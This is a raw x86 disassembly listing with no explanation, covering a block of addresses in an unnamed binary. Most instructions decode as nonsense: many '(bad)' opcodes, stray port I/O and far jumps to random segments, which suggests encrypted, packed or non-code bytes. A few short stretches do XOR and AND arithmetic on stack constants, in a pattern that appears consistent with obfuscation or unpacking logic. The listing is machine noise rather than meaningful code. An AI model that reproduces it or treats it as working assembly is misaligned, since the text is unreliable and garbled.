  40e028:	call   0x33b3:0xade188e0
  40e02f:	cmp    al,ah
  40e031:	iret   
  40e032:	fild   DWORD PTR [ebx+0x70]
  40e035:	(bad)  
  40e036:	iret   
  40e037:	test   BYTE PTR [esi],cl
  40e039:	adc    esi,DWORD PTR [edi]
  40e03b:	cld    
  40e03c:	stc    
  40e03d:	adc    ebp,DWORD PTR [ebx-0x2aea6d4]
  40e043:	arpl   WORD PTR [edi+esi*4+0x53],bx
  40e047:	les    ecx,FWORD PTR [esi-0x76]
  40e04a:	stos   DWORD PTR es:[edi],eax
  40e04b:	cmp    cl,bl
  40e04d:	jmp    0x40e05d
  40e04f:	and    BYTE PTR ds:0xf0fce0b5,bh
  40e055:	fisttp WORD PTR [edx+0x45]
  40e058:	out    dx,al
  40e059:	outs   dx,WORD PTR ds:[esi]
  40e05b:	inc    edx
  40e05c:	mov    gs,ebp
  40e05e:	pop    ss
  40e05f:	mov    dl,0xa0
  40e061:	(bad)  
  40e063:	jp     0x40e0b3
  40e065:	arpl   WORD PTR [esi],bx
  40e067:	inc    sp
  40e069:	dec    esp
  40e06a:	cdq    
  40e06b:	mov    al,ds:0x23fb6dda
  40e070:	in     eax,0x29
  40e072:	pop    ebp
  40e073:	or     cl,ch
  40e075:	inc    ecx
  40e076:	out    dx,eax
  40e077:	int3   
  40e078:	mov    ds,edi
  40e07a:	lods   al,BYTE PTR ds:[esi]
  40e07b:	pop    ds
  40e07c:	mov    WORD PTR [esi-0x20dd1e39],gs
  40e082:	lods   al,BYTE PTR ds:[esi]
  40e083:	retf   0xe524
  40e086:	jle    0x40e08f
  40e088:	mov    ds:0xc54e45c2,eax
  40e08d:	xor    eax,esp
  40e08f:	in     eax,dx
  40e090:	cmp    cl,BYTE PTR [esi+ecx*2]
  40e093:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e094:	into   
  40e095:	pop    esp
  40e096:	mov    al,0xda
  40e098:	shr    BYTE PTR [edi-0x572c9126],1
  40e09e:	pop    ecx
  40e09f:	push   ecx
  40e0a0:	les    eax,FWORD PTR [edx+0x10ce8bc6]
  40e0a6:	shl    BYTE PTR [edx+0x6a671c0a],cl
  40e0ac:	xor    al,ch
  40e0ae:	add    BYTE PTR [esi+ebp*4-0x68],ah
  40e0b2:	pushf  
  40e0b3:	xor    esp,esp
  40e0b5:	adc    al,0xfc
  40e0b7:	xor    BYTE PTR [ecx+0x7bb01986],0x49
  40e0be:	pop    ss
  40e0bf:	mov    bl,0x67
  40e0c1:	fld    TBYTE PTR [ebx+0xa]
  40e0c4:	dec    ebx
  40e0c5:	das    
  40e0c6:	mov    bl,BYTE PTR [esi]
  40e0c8:	mov    ss,WORD PTR [ebx+0x3f5696bb]
  40e0ce:	test   ecx,edx
  40e0d0:	nop
  40e0d1:	xchg   esp,eax
  40e0d2:	call   0x82ffa412
  40e0d7:	sub    DWORD PTR [edi-0x53bc3def],eax
  40e0dd:	adc    BYTE PTR [edx+edx*1+0x1f47953d],bl
  40e0e4:	in     eax,0x87
  40e0e6:	mov    esp,0x4c221008
  40e0eb:	and    dl,dh
  40e0ed:	mov    ds:0x51b1908d,eax
  40e0f2:	rol    DWORD PTR [ebx+0x9],cl
  40e0f5:	rcl    BYTE PTR [eax],1
  40e0f7:	dec    ebx
  40e0f8:	add    ebx,esi
  40e0fa:	js     0x40e0e7
  40e0fc:	fld    st(0)
  40e0fe:	inc    esi
  40e0ff:	push   es
  40e100:	jmp    0x7e6a:0x891d65dc
  40e107:	arpl   WORD PTR [ebp+0x51],di
  40e10a:	pop    ecx
  40e10b:	popa   
  40e10c:	adc    ebx,edx
  40e10e:	lods   eax,DWORD PTR ds:[esi]
  40e10f:	jns    0x40e13b
  40e111:	adc    BYTE PTR [ebx],cl
  40e113:	inc    eax
  40e114:	adc    ah,cl
  40e116:	pop    ss
  40e117:	or     edx,DWORD PTR [ebx+0x19589e1d]
  40e11d:	bnd je 0x40e10a
  40e120:	push   edi
  40e121:	aam    0x52
  40e123:	ds jmp 0x40e125
  40e126:	les    esp,FWORD PTR [ebp+0x73]
  40e129:	cld    
  40e12a:	into   
  40e12b:	test   eax,0xa02f817c
  40e130:	sbb    eax,0x601542d2
  40e135:	lea    ebx,[edi]
  40e137:	and    BYTE PTR ds:0x87574909,ah
  40e13d:	sub    edx,DWORD PTR [eax]
  40e13f:	xchg   ebx,eax
  40e140:	push   ebp
  40e141:	add    ebx,ebp
  40e143:	xchg   edi,eax
  40e144:	push   ds
  40e145:	inc    ebx
  40e146:	push   cs
  40e147:	repnz xor eax,0xf3a1280a
  40e14d:	cdq    
  40e14e:	inc    edi
  40e14f:	adc    ah,BYTE PTR [ecx+edi*4]
  40e152:	shl    ebx,1
  40e154:	into   
  40e155:	lahf   
  40e156:	cmp    BYTE PTR [esi+0x59],cl
  40e159:	enter  0x8da0,0xa9
  40e15d:	xchg   ebp,eax
  40e15e:	popa   
  40e15f:	pop    ebx
  40e160:	sbb    BYTE PTR [ecx+0x5b],ah
  40e163:	ret    
  40e164:	xchg   eax,ebp
  40e166:	jns    0x40e1ab
  40e168:	push   cs
  40e169:	mov    BYTE PTR [ebp-0xa],dl
  40e16c:	mov    eax,ds:0xccd0fc70
  40e171:	mov    dh,0xee
  40e173:	rcl    BYTE PTR [edi],cl
  40e175:	(bad)  [ecx]
  40e177:	sbb    al,BYTE PTR [ebp+0x59]
  40e17a:	adc    DWORD PTR ds:0x35f0458b,esp
  40e180:	into   
  40e181:	loope  0x40e182
  40e183:	inc    DWORD PTR [ebx]
  40e185:	inc    ebp
  40e186:	hlt    
  40e187:	jmp    0x40e44b
  40e18c:	sub    dh,ah
  40e18e:	mov    BYTE PTR [ecx],ah
  40e190:	inc    esi
  40e191:	pop    ds
  40e192:	and    dh,bl
  40e194:	leave  
  40e195:	out    0x4b,eax
  40e197:	jle    0x40e1a8
  40e199:	aad    0x21
  40e19b:	jle    0x40e16b
  40e19d:	enter  0x1818,0xd2
  40e1a1:	adc    al,0x18
  40e1a3:	sbb    BYTE PTR [esi+0x14f72cf0],ah
  40e1a9:	gs mov bl,0x28
  40e1ac:	push   eax
  40e1ad:	inc    ebp
  40e1ae:	mov    BYTE PTR [esi+ebx*4-0x42f9c200],bh
  40e1b5:	sub    DWORD PTR [eax],esi
  40e1b7:	test   ebp,esi
  40e1b9:	je     0x40e224
  40e1bb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e1bc:	dec    esp
  40e1bd:	iret   
  40e1be:	and    esi,DWORD PTR [edx-0x20a086d8]
  40e1c4:	xchg   edx,eax
  40e1c5:	pop    ecx
  40e1c6:	push   cs
  40e1c7:	dec    esi
  40e1c8:	adc    ebx,DWORD PTR [esi+0x48]
  40e1cb:	std    
  40e1cc:	pop    ebx
  40e1cd:	adc    BYTE PTR [esi+0x201aa0a1],bl
  40e1d3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e1d4:	xchg   ebx,eax
  40e1d5:	inc    edx
  40e1d6:	jp     0x40e159
  40e1d8:	rcr    DWORD PTR [eax-0xb],cl
  40e1db:	jge    0x40e249
  40e1dd:	mov    al,ds:0x585bfc9b
  40e1e2:	iret   
  40e1e3:	(bad)  
  40e1e4:	xchg   ebx,eax
  40e1e5:	xchg   edi,eax
  40e1e6:	cmp    edx,DWORD PTR [ecx-0x1f]
  40e1e9:	adc    DWORD PTR [esi],eax
  40e1eb:	and    al,0xd7
  40e1ed:	jae    0x40e262
  40e1ef:	cli    
  40e1f0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e1f1:	dec    BYTE PTR [esi+0x78]
  40e1f4:	jmp    0xa6eea
  40e1f9:	push   cs
  40e1fa:	jo     0x40e1ef
  40e1fc:	push   ds
  40e1fd:	fxch   st(5)
  40e1ff:	mov    ds:0xe8e48e4b,eax
  40e204:	cmp    DWORD PTR [ecx],esp
  40e206:	popa   
  40e207:	jle    0x40e19a
  40e209:	xor    eax,0x70650e76
  40e20e:	loop   0x40e239
  40e210:	sbb    eax,0xa75d4b21
  40e215:	(bad)  
  40e216:	sti    
  40e217:	fldcw  WORD PTR [esi+0x7971e1ef]
  40e21d:	xlat   BYTE PTR ds:[ebx]
  40e21e:	mov    al,0x3f
  40e220:	(bad)  
  40e221:	jmp    0x2b2e1f9f
  40e226:	xchg   ebx,eax
  40e227:	sub    esp,DWORD PTR [esi+0x34c7e71]
  40e22d:	push   0x835fc1c1
  40e232:	dec    esp
  40e233:	pop    esi
  40e234:	push   ss
  40e235:	xchg   DWORD PTR fs:[ebp-0x2fa2f854],ecx
  40e23c:	mov    esp,0xf9e9b26b
  40e241:	call   0xc2edbe64
  40e246:	mov    esi,0xa944b258
  40e24b:	out    0x7,al
  40e24d:	mov    ah,0x37
  40e24f:	or     eax,0xcd72805b
  40e254:	pop    ds
  40e255:	add    bh,BYTE PTR [edi]
  40e257:	test   BYTE PTR [edi+0x55a445f1],cl
  40e25d:	and    al,0xa7
  40e25f:	aam    0x7a
  40e261:	mov    ebp,0x7008ef22
  40e266:	sbb    DWORD PTR [ebp+0x5],ecx
  40e269:	repnz cmp eax,edx
  40e26c:	mov    bh,0x3d
  40e26e:	push   esp
  40e26f:	rol    DWORD PTR [si],1
  40e272:	loopne 0x40e2d7
  40e274:	aad    0x7c
  40e276:	pop    ebp
  40e277:	jo     0x40e287
  40e279:	pop    edi
  40e27a:	int    0x1e
  40e27c:	mov    WORD PTR [ebx-0x2443f797],?
  40e282:	scas   eax,DWORD PTR es:[edi]
  40e283:	aas    
  40e284:	in     eax,0x25
  40e286:	or     BYTE PTR [esi+0x16],cl
  40e289:	jno    0x40e267
  40e28b:	cmp    bh,BYTE PTR [edx]
  40e28d:	mov    dh,ah
  40e28f:	mov    dl,0xff
  40e291:	(bad)  
  40e292:	push   esi
  40e293:	xor    esp,esp
  40e295:	gs xchg ebp,eax
  40e297:	xor    edi,DWORD PTR [ecx-0x3d]
  40e29a:	and    bh,BYTE PTR [eax]
  40e29c:	shl    DWORD PTR [ecx+0x59],cl
  40e29f:	jns    0x40e2a3
  40e2a1:	pop    ebx
  40e2a2:	ja     0x40e2dc
  40e2a4:	mov    cl,0x24
  40e2a6:	dec    eax
  40e2a7:	in     al,dx
  40e2a8:	cwde   
  40e2a9:	and    DWORD PTR [edi-0x40aa24dc],ebx
  40e2af:	jp     0x40e32c
  40e2b1:	not    dh
  40e2b3:	ror    DWORD PTR [ebp+edx*1+0x1d],0x65
  40e2b8:	cmp    DWORD PTR [edi-0x3decff17],0x7926f2b0
  40e2c2:	push   eax
  40e2c3:	jl     0x40e252
  40e2c5:	dec    ecx
  40e2c6:	jne    0x40e2f6
  40e2c8:	xchg   ebp,eax
  40e2c9:	(bad)  [ecx-0x592bdca1]
  40e2cf:	mov    ecx,0x28373611
  40e2d4:	frstor [esi+0x64]
  40e2d7:	jmp    0xef6df94b
  40e2dc:	inc    ebx
  40e2dd:	pop    esi
  40e2de:	mov    edx,0x9f0824bd
  40e2e3:	sub    eax,0x36ea43e8
  40e2e8:	xor    bl,BYTE PTR ds:0x8b261fb4
  40e2ee:	sbb    ecx,DWORD PTR [ecx]
  40e2f0:	repz (bad) 
  40e2f2:	jmp    0xb46f:0xe55e541e
  40e2f9:	test   esp,0xbfcc893a
  40e2ff:	adc    edi,edi
  40e301:	nop
  40e302:	shr    DWORD PTR ds:0x8151edcb,0x2e
  40e309:	jo     0x40e2d0
  40e30b:	add    cl,BYTE PTR [ebx-0xb]
  40e30e:	ror    DWORD PTR [esi],cl
  40e310:	inc    edx
  40e311:	mov    ebp,0xd5aee621
  40e316:	bound  esi,QWORD PTR [ebx-0x7373989c]
  40e31c:	outs   dx,BYTE PTR ds:[esi]
  40e31d:	mov    bh,0x2d
  40e31f:	in     eax,dx
  40e320:	scas   eax,DWORD PTR es:[edi]
  40e321:	mov    WORD PTR [ebx+0x6c],ss
  40e324:	ret    
  40e325:	push   ss
  40e326:	mov    BYTE PTR [eax+0x5f68590c],ah
  40e32c:	or     DWORD PTR [edi],eax
  40e32e:	adc    ebp,edx
  40e330:	lods   al,BYTE PTR ds:[esi]
  40e331:	in     al,dx
  40e332:	fwait
  40e333:	popf   
  40e334:	mov    eax,0x89494c52
  40e339:	sub    eax,0xa58b0b56
  40e33e:	dec    esi
  40e33f:	cmp    eax,0xb5cd1903
  40e344:	mov    DWORD PTR [esi-0x12],ebx
  40e347:	pusha  
  40e348:	push   ecx
  40e349:	and    DWORD PTR [edi+eiz*4],edx
  40e34c:	jg     0x40e330
  40e34e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e34f:	imul   edx,DWORD PTR [esi-0x7e],0x1e
  40e353:	inc    edx
  40e354:	cmp    bh,BYTE PTR [ebp-0x76acf444]
  40e35a:	imul   eax,esi,0x41
  40e35d:	icebp  
  40e35e:	or     eax,0x9bbdcac0
  40e363:	aaa    
  40e364:	mov    eax,ds:0x333d0df8
  40e369:	mov    bh,0xd
  40e36b:	sub    eax,0x44baf08
  40e370:	push   esp
  40e371:	jmp    0x503b:0x44ed38fd
  40e378:	js     0x40e338
  40e37a:	add    BYTE PTR [esi+0x4d732a1c],dh
  40e380:	add    al,0x81
  40e382:	mov    esi,0x77e06b50
  40e387:	test   eax,0x862764b7
  40e38c:	loope  0x40e3cc
  40e38e:	add    al,0x6e
  40e390:	out    0x5d,eax
  40e392:	dec    ecx
  40e393:	add    dh,BYTE PTR cs:[bx+si-0x2a]
  40e398:	xor    esp,DWORD PTR [eax+0x43]
  40e39b:	cmp    eax,0xac06a7f3
  40e3a0:	mov    al,0xb6
  40e3a2:	mov    ecx,0x17431462
  40e3a7:	push   ebp
  40e3a8:	mov    ebp,0xf88bb6df
  40e3ad:	loop   0x40e3b0
  40e3af:	push   edx
  40e3b0:	aaa    
  40e3b1:	ins    BYTE PTR es:[edi],dx
  40e3b2:	ret    0x96e6
  40e3b5:	cs scas eax,DWORD PTR es:[edi]
  40e3b7:	or     DWORD PTR [ecx+ebp*2],edi
  40e3ba:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e3bb:	inc    esi
  40e3bc:	pop    eax
  40e3bd:	xor    cl,BYTE PTR [esi]
  40e3bf:	in     al,dx
  40e3c0:	les    esp,FWORD PTR [edi]
  40e3c2:	sub    al,0xb
  40e3c4:	add    esp,ebp
  40e3c6:	lods   al,BYTE PTR ds:[esi]
  40e3c7:	sub    dl,BYTE PTR [ecx+0x32b0bc27]
  40e3cd:	adc    bl,BYTE PTR [edi-0x45]
  40e3d0:	ins    BYTE PTR es:[edi],dx
  40e3d1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e3d2:	ret    0x178
  40e3d5:	ror    dh,cl
  40e3d7:	pop    esi
  40e3d8:	enter  0xe1d4,0xe
  40e3dc:	mov    al,ds:0x6d0eaaab
  40e3e1:	push   es
  40e3e2:	je     0x40e412
  40e3e4:	bswap  ebx
  40e3e6:	mov    bh,0x77
  40e3e8:	fcmove st,st(6)
  40e3ea:	fist   DWORD PTR [esi+0x4862ef7c]
  40e3f0:	mov    esi,0x2feaba64
  40e3f5:	inc    esi
  40e3f6:	das    
  40e3f7:	stc    
  40e3f8:	xchg   ecx,eax
  40e3f9:	out    0xf8,al
  40e3fb:	enter  0xec22,0x99
  40e3ff:	jae    0x40e3fb
  40e401:	dec    ebx
  40e402:	mov    ds:0x40269aa1,eax
  40e407:	pop    ds
  40e408:	push   0x42
  40e40a:	jo     0x40e47e
  40e40c:	mov    bl,0x90
  40e40e:	jne    0x40e437
  40e410:	pop    edx
  40e411:	pusha  
  40e412:	jle    0x40e3fe
  40e414:	(bad)  
  40e415:	gs pop eax
  40e417:	aam    0x46
  40e419:	jne    0x40e459
  40e41b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e41c:	or     eax,0xf96e9cec
  40e421:	call   DWORD PTR [esi-0x11]
  40e424:	je     0x40e443
  40e426:	(bad)  
  40e427:	mov    ah,0x4c
  40e429:	call   0x1bd74013
  40e42e:	stc    
  40e42f:	das    
  40e430:	jmp    0xe401:0x2e16985e
  40e437:	fiadd  WORD PTR [ecx+0x3]
  40e43a:	xor    ah,al
  40e43c:	dec    ebp
  40e43d:	push   eax
  40e43e:	cli    
  40e43f:	int    0x8a
  40e441:	add    al,0x88
  40e443:	clc    
  40e444:	rcr    DWORD PTR [ecx+0x33],0x43
  40e448:	cmp    edi,DWORD PTR [edx+0x25d233c4]
  40e44e:	xor    ebp,DWORD PTR [ebp+0x0]
  40e451:	add    BYTE PTR [ebp-0x651ffe74],cl
  40e457:	(bad)  
  40e458:	dec    DWORD PTR [ebx+0x5d8b0845]
  40e45e:	cld    
  40e45f:	add    eax,edi
  40e461:	div    ebx
  40e463:	mov    edx,DWORD PTR [ebp-0x8]
  40e466:	mov    ebx,0x940a7
  40e46b:	sub    eax,edx
  40e46d:	xor    edx,edx
  40e46f:	div    ebx
  40e471:	add    eax,esi
  40e473:	cmp    ecx,eax
  40e475:	jb     0x40db77
  40e47b:	xor    ebx,ebx
  40e47d:	inc    ebx
  40e47e:	mov    DWORD PTR [ebp+0xc],0x77bd
  40e485:	mov    DWORD PTR [ebp+0x8],0x4f2a
  40e48c:	mov    DWORD PTR [ebp-0x8],0x4738
  40e493:	mov    DWORD PTR [ebp-0xc],0x6c4e
  40e49a:	mov    DWORD PTR [ebp-0x10],0x7f0d
  40e4a1:	mov    DWORD PTR [ebp-0x14],0x64ec
  40e4a8:	mov    DWORD PTR [ebp-0x18],0x1984
  40e4af:	mov    DWORD PTR [ebp-0x1c],0x293
  40e4b6:	mov    eax,DWORD PTR [ebp+0x8]
  40e4b9:	mov    ecx,DWORD PTR [ebp+0xc]
  40e4bc:	add    eax,0x1ef2
  40e4c1:	and    eax,ecx
  40e4c3:	xor    eax,0x7240
  40e4c8:	mov    ecx,0x7aaa
  40e4cd:	jmp    0x40e791
  40e4d2:	mov    eax,0x5a62ef3c
  40e4d7:	and    bl,BYTE PTR [edx+edi*1]
  40e4da:	ss dec esi
  40e4dc:	xor    DWORD PTR [eax+0x6a49ad21],0x1818c289
  40e4e6:	rcl    BYTE PTR [eax+ebx*1],cl
  40e4e9:	sbb    BYTE PTR [edi-0x75],bl
  40e4ec:	int3   
  40e4ed:	es sbb ebp,edx
  40e4f0:	jmp    0x2dca:0xd3ab7fff
  40e4f7:	push   ecx
  40e4f8:	sub    ebp,ecx
  40e4fa:	inc    edx
  40e4fb:	jecxz  0x40e562
  40e4fd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e4fe:	push   ebx
  40e4ff:	sahf   
  40e500:	adc    BYTE PTR [ebx],cl
  40e502:	mov    cl,0x1f
  40e504:	ja     0x40e4dc
  40e506:	mov    WORD PTR [ecx],ds
  40e508:	pushf  
  40e509:	adc    DWORD PTR [ebx],esp
  40e50b:	fst    QWORD PTR [esi-0x5434db79]
  40e511:	stos   BYTE PTR es:[edi],al
  40e512:	mov    al,0x2e
  40e514:	enter  0xb820,0x30
  40e518:	adc    DWORD PTR [ebx-0x402c9db7],esi
  40e51e:	pop    ebp
  40e51f:	fild   DWORD PTR [ebp+0x5e]
  40e522:	mov    ch,0x1e
  40e524:	inc    ebx
  40e525:	shl    BYTE PTR [ebx-0x65],1
  40e528:	and    eax,0x68970c96
  40e52d:	mov    ch,0x7b
  40e52f:	push   ss
  40e530:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e531:	or     BYTE PTR [ebp-0x49f10c74],0xa2
  40e538:	xor    al,0x4b
  40e53a:	mov    ecx,0xcf9b2138
  40e53f:	xlat   BYTE PTR ds:[ebx]
  40e540:	aam    0x84
  40e542:	and    al,0x34
  40e544:	out    0x77,eax
  40e546:	rcl    BYTE PTR [eax+0x6b],1
  40e549:	pop    eax
  40e54a:	div    bl
  40e54c:	ret    0x3d5f
  40e54f:	inc    edx
  40e550:	or     ebx,ecx
  40e552:	lods   eax,DWORD PTR ds:[esi]
  40e553:	add    BYTE PTR [edx],bl
  40e555:	test   eax,0xf8a7014d
  40e55a:	jnp    0x40e579
  40e55c:	add    al,0xbb
  40e55e:	cmp    bl,BYTE PTR [ebx+0x65]
  40e561:	neg    BYTE PTR [ebx+0x4e424e13]
  40e567:	pop    edx
  40e568:	mov    ds:0xf023a666,eax
  40e56d:	sub    al,0x16
  40e56f:	fcomp  QWORD PTR [ebx-0x51]
  40e572:	ja     0x40e50d
  40e574:	sub    BYTE PTR [ebx],al
  40e576:	adc    DWORD PTR [ecx*8-0x18773924],esi
  40e57d:	dec    edx
  40e57e:	dec    esp
  40e57f:	int3   
  40e580:	outs   dx,DWORD PTR ds:[esi]
  40e581:	inc    esi
  40e582:	jnp    0x40e5c6
  40e584:	add    eax,0xbf9613dd
  40e589:	loope  0x40e5d8
  40e58b:	and    al,0x4f
  40e58d:	repz fisub DWORD PTR [ecx+eiz*8-0x1c0055fc]
  40e595:	out    0x4f,eax
  40e597:	dec    ecx
  40e598:	in     eax,0x54
  40e59a:	add    edx,DWORD PTR [ebx]
  40e59c:	dec    ecx
  40e59d:	cwde   
  40e59e:	aaa    
  40e59f:	outs   dx,BYTE PTR ds:[esi]
  40e5a0:	popf   
  40e5a1:	dec    edx
  40e5a2:	aaa    
  40e5a3:	or     BYTE PTR [edi],cl
  40e5a5:	(bad)  
  40e5a6:	and    dh,BYTE PTR [ecx-0x3a0b145c]
  40e5ac:	sbb    eax,0xef19339f
  40e5b1:	adc    edi,DWORD PTR [ebx+0x66d56f18]
  40e5b7:	mov    cl,0xf9
  40e5b9:	jnp    0x40e635
  40e5bb:	or     BYTE PTR [eax+0x58],0x5f
  40e5bf:	adc    DWORD PTR [edi+0x6d9570fd],edi
  40e5c5:	dec    ebx
  40e5c6:	sub    DWORD PTR ds:0x7e13dde7,edx
  40e5cc:	mov    bl,0xc8
  40e5ce:	xchg   BYTE PTR [edx],cl
  40e5d0:	into   
  40e5d1:	sub    ebp,DWORD PTR [ebx]
  40e5d3:	dec    esi
  40e5d4:	and    eax,0x4a3be383
  40e5d9:	pop    edx
  40e5da:	cs jmp 0xc7b7ca1f
  40e5e0:	dec    edi
  40e5e1:	dec    esp
  40e5e2:	or     ch,BYTE PTR [ebx-0x53d7c884]
  40e5e8:	fadd   QWORD PTR [edx-0x3e]
  40e5eb:	jmp    edi
  40e5ed:	or     esp,DWORD PTR [esi-0x41ca434e]
  40e5f3:	retf   
  40e5f4:	sub    bl,BYTE PTR [eax]
  40e5f6:	(bad)  
  40e5f7:	movs   BYTE PTR es:[edi],BYTE PTR ss:[esi]
  40e5f9:	or     eax,0x7dc4b12
  40e5fe:	xor    BYTE PTR [ebp-0x3b],dh
  40e601:	ins    BYTE PTR es:[edi],dx
  40e602:	test   BYTE PTR [eax-0x60],bh
  40e605:	jmp    FWORD PTR [esi+edi*2]
  40e608:	aaa    
  40e609:	call   0xce03e53b
  40e60e:	popa   
  40e60f:	sahf   
  40e610:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e611:	stc    
  40e612:	aad    0x59
  40e614:	mov    ebp,0xe6fb14e7
  40e619:	push   es
  40e61a:	icebp  
  40e61b:	jne    0x40e5c6
  40e61d:	fild   DWORD PTR [edi+0x29749379]
  40e623:	bsr    ebp,DWORD PTR [eax+eiz*2+0x7cb429ca]
  40e62b:	xchg   DWORD PTR [edx+0x5e9ffbd4],ecx
  40e631:	mov    ch,0xc5
  40e633:	std    
  40e634:	loop   0x40e629
  40e636:	bound  ebp,QWORD PTR [ecx+0x4e]
  40e639:	xor    ax,0xa9ce
  40e63d:	cmp    dh,dl
  40e63f:	icebp  
  40e640:	mov    eax,0x1b559cbb
  40e645:	retf   
  40e646:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e647:	cmp    al,0xdd
  40e649:	mov    dl,0xd9
  40e64b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e64c:	push   ebx
  40e64d:	in     al,dx
  40e64e:	ins    DWORD PTR es:[edi],dx
  40e64f:	pop    esp
  40e650:	inc    ebp
  40e651:	inc    esp
  40e652:	push   esi
  40e653:	test   DWORD PTR [ebx],esp
  40e655:	mov    dh,0x57
  40e657:	fs in  al,dx
  40e659:	out    dx,eax
  40e65a:	pop    ebp
  40e65b:	dec    ebp
  40e65c:	mov    eax,ds:0x779245ba
  40e661:	mov    ds:0x864d047f,al
  40e666:	hlt    
  40e667:	and    al,0x2b
  40e669:	repnz mov dh,0x1f
  40e66c:	les    edi,FWORD PTR [edi]
  40e66e:	mov    DWORD PTR [eax+0x17e8fb1a],ebp
  40e674:	push   0xfd5a8ce7
  40e679:	mov    esp,0x1b686247
  40e67e:	rcr    BYTE PTR [eax],cl
  40e680:	dec    esp
  40e681:	fldenv [ebx-0x66]
  40e684:	sbb    dh,BYTE PTR [ecx-0x38]
  40e687:	(bad)  
  40e689:	mov    BYTE PTR [esi],cl
  40e68b:	mov    edi,DWORD PTR [edx+edi*1-0x530e9256]
  40e692:	pop    eax
  40e693:	jg     0x40e660
  40e695:	test   eax,0xc676beba
  40e69a:	jo     0x40e66d
  40e69c:	mov    eax,0x281c3ec6
  40e6a1:	inc    esi
  40e6a2:	out    dx,al
  40e6a3:	idiv   DWORD PTR [edx]
  40e6a5:	mov    dl,0xf8
  40e6a7:	fidiv  DWORD PTR [ebx+0x6c]
  40e6aa:	cli    
  40e6ab:	mov    cs,WORD PTR [eax+edx*2+0x1]
  40e6af:	aam    0x8a
  40e6b1:	mov    ecx,eax
  40e6b3:	or     ah,BYTE PTR [ecx-0x30]
  40e6b6:	xchg   BYTE PTR [esi+0x2f],ch
  40e6b9:	dec    edx
  40e6ba:	xor    ah,BYTE PTR [esi-0x61e47bdf]
  40e6c0:	lock sbb BYTE PTR [esi+0x41],al
  40e6c4:	pop    ds
  40e6c5:	pop    edi
  40e6c7:	std    
  40e6c8:	add    BYTE PTR [eax-0x78],dl
  40e6cb:	shr    ecx,1
  40e6cd:	cmp    al,0xb6
  40e6cf:	in     al,dx
  40e6d0:	mov    dl,0xec
  40e6d2:	cdq    
  40e6d3:	adc    dl,BYTE PTR [esi+0x78]
  40e6d6:	mov    edx,0xb4b3c4c8
  40e6db:	ja     0x40e75b
  40e6dd:	enter  0xab38,0xa0
  40e6e1:	pop    ds
  40e6e2:	shr    edi,0xa0
  40e6e5:	sbb    al,0x38
  40e6e7:	je     0x40e710
  40e6e9:	dec    esi
  40e6ea:	addr16 pop esi
  40e6ec:	repnz mov eax,0xbf19d9f2
  40e6f2:	mov    ebx,DWORD PTR [eax-0x2e5b832b]
  40e6f8:	pop    ss
  40e6f9:	test   al,0x31
  40e6fb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e6fc:	xor    edi,DWORD PTR [ebp-0x49]
  40e6ff:	push   ebx
  40e700:	jle    0x40e693
  40e702:	(bad)  
  40e703:	and    DWORD PTR [ebx-0x5d],esi
  40e706:	rol    DWORD PTR [edx+0x6c],0x5b
  40e70a:	jbe    0x40e754
  40e70c:	popf   
  40e70d:	mov    ds:0xf671056a,al
  40e712:	fwait
  40e713:	pop    edi
  40e714:	js     0x40e776
  40e716:	aaa    
  40e717:	and    esi,DWORD PTR [edx+0x66f18fd7]
  40e71d:	pusha  
  40e71e:	mov    ?,WORD PTR [ebp-0x5637c106]
  40e724:	sti    
  40e725:	pop    edx
  40e726:	mov    ch,BYTE PTR [ebp+0x2e]
  40e729:	in     eax,0x17
  40e72b:	pop    edi
  40e72c:	dec    eax
  40e72d:	sbb    bh,BYTE PTR ds:[esi]
  40e730:	clc    
  40e731:	mov    ecx,0x96bfb627
  40e736:	in     al,0x83
  40e738:	(bad)  
  40e739:	call   0xa68284b3
  40e73e:	sub    eax,0x1de11aeb
  40e743:	push   edx
  40e744:	or     eax,0x22e2548f
  40e749:	push   0xffffffc4
  40e74b:	mov    eax,DWORD PTR [edi]
  40e74d:	call   0x1b81eb29
  40e752:	jmp    0x104d956e
  40e757:	pusha  
  40e758:	call   0x9dc54f48
  40e75d:	jb     0x40e706
  40e75f:	test   DWORD PTR [edi+ebp*1-0x6],ebx
  40e763:	sbb    edi,edi
  40e765:	xchg   ebp,eax
  40e766:	xchg   esi,eax
  40e767:	scas   eax,DWORD PTR es:[edi]
  40e768:	jge    0x40e702
  40e76a:	push   edi
  40e76b:	stos   DWORD PTR es:[edi],eax
  40e76c:	mov    ds:0xc0d7b5a7,eax
  40e771:	dec    ch
  40e773:	jno    0x40e70b
  40e775:	xchg   ebx,eax
  40e776:	jmp    0x40e77c
  40e778:	pop    esi
  40e779:	xor    edx,DWORD PTR [ebx+0x62]
  40e77c:	pop    DWORD PTR [edx+0x73]
  40e77f:	addr16 call 0x3a60a0d7
  40e785:	loop   0x40e783
  40e787:	test   eax,0x1d16cb44
  40e78c:	js     0x40e743
  40e78e:	xchg   ebp,eax
  40e78f:	rcl    DWORD PTR ds:0x45c7c82b,cl
  40e795:	or     al,0xd3
  40e797:	or     BYTE PTR [eax],al
  40e799:	add    bh,al
  40e79b:	inc    ebp
  40e79c:	or     BYTE PTR [edx-0x76ffffdd],dl
  40e7a2:	pop    ebp
  40e7a3:	loopne 0x40e76c
  40e7a5:	inc    ebp
  40e7a6:	fmul   QWORD PTR [edi-0x38ffffcd]
  40e7ac:	inc    ebp
  40e7ad:	fmul   st,st(1)
  40e7af:	popa   
  40e7b0:	add    BYTE PTR [eax],al
  40e7b2:	mov    eax,DWORD PTR [ebp+0x8]
  40e7b5:	mov    edx,DWORD PTR [ebp+0xc]
  40e7b8:	imul   eax,edx
  40e7bb:	xor    eax,0x40a0
  40e7c0:	or     eax,0x1a48
  40e7c5:	xor    eax,0x139ddb0
  40e7ca:	mov    esi,ecx
